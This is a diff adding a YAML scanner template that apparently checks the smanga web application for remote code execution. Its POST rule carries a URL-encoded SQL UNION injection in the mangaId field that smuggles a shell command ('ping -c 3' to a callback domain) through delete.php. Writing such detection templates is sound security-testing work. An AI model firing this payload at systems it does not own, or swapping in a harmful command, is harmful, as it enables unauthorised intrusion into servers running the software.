@@ -1,0 +1,27 @@
+id: smanga-rce
+info:
+  name: smanga-rce
+  author: niko
+  severity: high
+  description: |
+    smanga-rce
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+rules:
+  r0:
+    request:
+      method: GET
+      path: /php/manga/delete.php
+    expression: response.status == 200 && response.body.bcontains(b"\"code\":2")
+   
+  r1:
+    request:
+      method: POST
+      path: /php/manga/delete.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: mangaId=1+union+select+*+from+%28select+1%29a+join+%28select+2%29b+join+%28select+3%29c+join+%28select+4%29d+join+%28select+%27%5C%22%3Bping+-c+3+{{reverseDomain}}%3B%5C%22%27%29e+join+%28select+6%29f+join+%28select+7%29g+join+%28select+8%29h+join+%28select+9%29i+join+%28select+10%29j+join+%28select+11%29k+join+%28select+12%29l%3B&deleteFile=true
+    expression: response.status == 200 && reverse.wait(5) && response.body.bcontains(b"\"code\":0")
+
+expression: r0() && r1()
